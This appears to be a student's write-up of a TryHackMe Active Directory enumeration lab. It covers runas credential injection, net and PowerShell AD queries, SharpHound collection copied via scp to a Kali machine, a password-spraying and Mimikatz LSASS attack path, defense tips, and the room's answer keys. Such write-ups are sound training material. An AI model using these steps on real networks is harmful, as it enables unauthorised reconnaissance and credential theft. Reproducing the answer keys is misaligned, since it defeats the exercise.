
### Name: Dhruv Sharma | Date: 09-06-2026 | Platform: TryHackMe

---

# TASK 2 — Credential Injection (runas.exe)

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Inject discovered AD credentials into memory
on a non-domain-joined Windows machine
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:

runas.exe:
→ Native Windows binary (no install needed)
→ Injects credentials directly into memory
→ All NETWORK connections use injected creds
→ Local commands still run as original user

SYSVOL:
→ Shared folder present on ALL Domain Controllers
→ Stores GPOs and domain-related scripts
→ Readable by ANY authenticated AD account
→ Used to verify if credentials are valid

IP vs Hostname:
→ Hostname → Kerberos authentication (default)
→ IP address → Forces NTLM authentication
→ Red teams prefer hostname — harder to detect

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ KEY STEPS:

1. Inject credentials using runas
2. Configure DNS to point to DC
3. List SYSVOL to verify credentials work

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Inject AD credentials into memory
runas.exe /netonly /user:za.tryhackme.com\<username> cmd.exe
→ /netonly : Use creds only for network connections
→ /user    : Domain\Username format (use FQDN)
→ cmd.exe  : Opens new CMD with injected creds

# Configure DNS manually (PowerShell)
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' |
         Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index
         -ServerAddresses $dnsip

# Verify DNS is working
nslookup za.tryhackme.com
→ Should resolve to DC IP

# Test credentials — list SYSVOL
dir \\za.tryhackme.com\SYSVOL\
→ If content shows = credentials are valid ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT:
AD credentials successfully injected and
verified from a non-domain-joined machine

🛡️ DEFENSE:
→ Enforce MFA on all privileged accounts
→ Never store credentials/scripts in SYSVOL
→ Monitor runas usage via SIEM alerts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: Native Windows binary for credential injection?
A: runas.exe
Q: Parameter to use creds only for network auth?
A: /netonly
Q: Folder on DC storing GPO info?
A: SYSVOL
Q: Default auth type when using hostname?
A: Kerberos
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# TASK 3 — Enumeration via MMC

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Enumerate the full AD structure visually
using Microsoft Management Console
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:

MMC (Microsoft Management Console):
→ Built-in Windows GUI administration tool
→ Uses Snap-ins to manage different services
→ Must be launched from runas CMD window
  (otherwise uses local account, not AD creds)

RSAT (Remote Server Administration Tools):
→ Provides AD Snap-ins for MMC
→ Allows managing AD remotely
→ Pre-installed on THMJMP1

Key rule:
→ Open MMC from normal session = local auth ❌
→ Open MMC from runas CMD = AD creds used ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ KEY STEPS:

1. Open MMC from runas CMD window
2. File → Add/Remove Snap-in
3. Add all 3 AD Snap-ins:
   → AD Domains and Trusts
   → AD Sites and Services
   → AD Users and Computers
4. Point each to za.tryhackme.com
5. Enable View → Advanced Features
6. Enumerate Users, Groups, Computers, OUs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# From runas CMD window:
mmc        → Opens MMC GUI

# RSAT Install (if not present):
Start → Apps & Features → Optional Features
→ "RSAT: Active Directory Domain Services" → Install

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 WHAT MMC SHOWS:
→ Users organized by department OUs
→ Group memberships per user
→ Computers (Servers OU + Workstations OU)
→ Full OU/organizational structure
→ Object properties and attributes
→ Description fields (may contain flags/info!)

Pros:  Holistic view, fast object search,
       can modify objects if permissions allow
Cons:  Needs GUI access, slow for bulk queries

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT:
Full AD structure visible — users, groups,
computers, OUs, and object attributes

🛡️ DEFENSE:
→ Restrict RSAT installation to admins only
→ Never put sensitive info in Description fields
→ Monitor MMC snap-in usage on non-admin machines
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# TASK 4 — Enumeration via Command Prompt

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Quickly enumerate AD users, groups and
password policy using built-in net commands
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
→ net is a built-in Windows command
→ No extra tools needed — very stealthy
→ Blue teams rarely monitor net commands
→ Works inside RAT payloads and VBScript
→ Must run from a domain-joined machine

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# List ALL domain users
net user /domain

# Get details of a specific user
net user <username> /domain
→ Shows: groups, password policy,
         last logon, account status

# List ALL domain groups
net group /domain

# List members of a specific group
net group "Domain Admins" /domain
net group "Tier 1 Admins" /domain

# Get domain password policy
net accounts /domain
→ Shows: lockout threshold, min password length,
         password history, max password age

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PASSWORD POLICY — WHY IT MATTERS:
Lockout threshold → How many wrong attempts before lock
Lockout duration  → How long account stays locked
Min length        → Helps craft better spray passwords
Password history  → How many old passwords remembered

Use this info BEFORE password spraying
to avoid locking accounts!

Limitation:
→ If user is in 10+ groups, not all shown
→ Only works on domain-joined machine

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT:
User list, group memberships, and password
policy gathered — ready for spraying attack

🛡️ DEFENSE:
→ Set lockout threshold (recommend: 5 attempts)
→ Enforce minimum password length (12+ chars)
→ Monitor bulk net user /domain queries
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: aaron.harris group besides Domain Users?
A: Internet Access
Q: Is Guest account active?
A: Nay
Q: Tier 1 Admins member count?
A: 7
Q: Account lockout duration (minutes)?
A: 30
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# TASK 5 — Enumeration via PowerShell

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Deep AD enumeration using PowerShell
AD-RSAT cmdlets — more detail than net commands
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
→ PowerShell cmdlets = .NET classes for AD
→ Much more detail than CMD net commands
→ Can specify -Server to target remote DC
→ Works from non-domain machine via runas
→ Blue teams monitor PS more than CMD

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Upgrade CMD to PowerShell
powershell

# ── USER ENUMERATION ──

# Get specific user (all properties)
Get-ADUser -Identity gordon.stevens
           -Server za.tryhackme.com
           -Properties *

# Find users matching a pattern
Get-ADUser -Filter 'Name -like "*stevens"'
           -Server za.tryhackme.com |
           Format-Table Name,SamAccountName -A

# ── GROUP ENUMERATION ──

# Get group details
Get-ADGroup -Identity Administrators
            -Server za.tryhackme.com

# Get group members
Get-ADGroupMember -Identity "Tier 1 Admins"
                  -Server za.tryhackme.com

# ── OBJECT ENUMERATION ──

# Find objects changed after a date
$ChangeDate = New-Object DateTime(2022,02,28,12,00,00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate'
             -includeDeletedObjects
             -Server za.tryhackme.com

# Find accounts with failed login attempts
# (use before spraying — avoid locked accounts!)
Get-ADObject -Filter 'badPwdCount -gt 0'
             -Server za.tryhackme.com

# ── DOMAIN INFO ──

# Get domain details
Get-ADDomain -Server za.tryhackme.com

# ── MODIFY OBJECTS (if permissions allow) ──

# Force change a user password
Set-ADAccountPassword -Identity gordon.stevens
  -Server za.tryhackme.com
  -OldPassword (ConvertTo-SecureString "old" -AsPlaintext -Force)
  -NewPassword (ConvertTo-SecureString "new" -AsPlainText -Force)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 KEY PARAMETERS:
-Identity   → Object name to query
-Server     → Point to specific DC
-Properties → Which attributes to show (* = all)
-Filter     → Search/filter results

Pros:  Extremely detailed, works remotely,
       can modify objects, scriptable
Cons:  More monitored by Blue team,
       RSAT must be installed

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT:
Detailed AD object information including
hidden attributes not visible in CMD

🛡️ DEFENSE:
→ Enable PowerShell Script Block Logging
→ Enable PowerShell Transcription logging
→ Monitor for Get-ADUser bulk queries
→ Constrained Language Mode for PS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: Beth Nolan's Title attribute?
A: Support
Q: Annette Manning's DistinguishedName?
A: CN=annette.manning,OU=Marketing,OU=People,
   DC=za,DC=tryhackme,DC=com
Q: Tier 2 Admins group creation date?
A: 2/24/2022 10:04:41 PM
Q: Enterprise Admins SID?
A: S-1-5-21-3330634377-1326264276-632209373-519
Q: Container for deleted AD objects?
A: CN=Deleted Objects,DC=za,DC=tryhackme,DC=com
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# TASK 6 — Enumeration via BloodHound

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Map entire AD environment as a graph and
find attack paths to Domain Admin
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 KEY TERMS:

SharpHound:
→ The COLLECTOR — gathers AD data
→ Outputs a ZIP file (JSON files inside)
→ Three versions:
   SharpHound.exe  → Windows executable
   SharpHound.ps1  → PowerShell (loads in memory)
   AzureHound.ps1  → For Azure AD environments

BloodHound:
→ The GUI — visualizes SharpHound data
→ Uses Neo4j graph database as backend
→ Shows nodes (objects) and edges (relationships)
→ Finds attack paths automatically

Key Philosophy:
"Defenders think in lists,
 Attackers think in graphs"
→ BloodHound changed AD security forever (2016)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ KEY STEPS:

1. Run SharpHound on Windows machine
2. Copy ZIP to Kali via SCP
3. Start Neo4j + BloodHound on Kali
4. Import ZIP into BloodHound
5. Run analysis queries
6. Find shortest path to Domain Admin

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Copy SharpHound to working directory
copy C:\Tools\Sharphound.exe ~\Documents\
cd ~\Documents\

# Run SharpHound — collect everything
SharpHound.exe --CollectionMethods All
               --Domain za.tryhackme.com
               --ExcludeDCs
→ All         : Collect all data types
→ ExcludeDCs  : Don't touch DCs (stay stealthy)

# Run SharpHound — sessions only (faster, repeat runs)
SharpHound.exe --CollectionMethods Session
               --Domain za.tryhackme.com
               --ExcludeDCs

# Copy ZIP to Kali (run on Kali)
scp <username>@THMJMP1.za.tryhackme.com:
C:/Users/<username>/Documents/<BloodHound.zip> .

# Start Neo4j (Kali)
neo4j console start

# Start BloodHound (Kali)
bloodhound --no-sandbox
→ Default creds: neo4j:neo4j

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 BLOODHOUND — WHAT TO LOOK FOR:

Node Info tab shows:
→ Active sessions on account
→ Group memberships
→ Local admin rights
→ RDP/execution rights
→ Outbound/Inbound control rights

Key Analysis Queries:
→ Find all Domain Admins
→ Find Shortest Path to Domain Admins
→ Find Kerberoastable Accounts
→ Find AS-REP Roastable Users
→ Computers where Domain Users are local admin

Edges = Attack paths:
→ MemberOf      → group membership
→ AdminTo       → local admin on machine
→ HasSession    → active user session on host
→ CanRDP        → RDP access
→ GenericAll    → full control over object
→ GenericWrite  → write to object attributes
→ ForceChangePassword → reset user password

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SESSION DATA STRATEGY:
→ Run "All" collection at start of assessment
→ Run "Session" collection twice daily:
   10:00 AM → users starting work
   14:00 PM → users back from lunch
→ Clear stale sessions:
   BloodHound → Database Info → Clear Session Info

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 EXAMPLE ATTACK PATH FOUND:
Domain Users → RDP to THMJMP1
→ T1 Admin has active session on THMJMP1
→ Dump LSASS memory with Mimikatz
→ Get T1 Admin hash → Tier 1 Admin access!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT:
Complete AD graph with attack paths
identified from low-priv user to Domain Admin

🛡️ DEFENSE:
→ Enforce tiering model — T1 admins
  should NOT log into workstations
→ BloodHound defensively — Blue teams
  should run it too (find paths before attacker)
→ ATA/Defender for Identity detects SharpHound
→ Limit group memberships and admin rights
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: SharpHound command for Session data only?
A: SharpHound.exe --CollectionMethods Session
   --Domain za.tryhackme.com --ExcludeDCs
Q: Kerberoastable accounts (besides krbtgt)?
A: 1
Q: Machines Tier 1 Admins have admin access to?
A: 2
Q: Tier 2 Admins member count?
A: 15
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
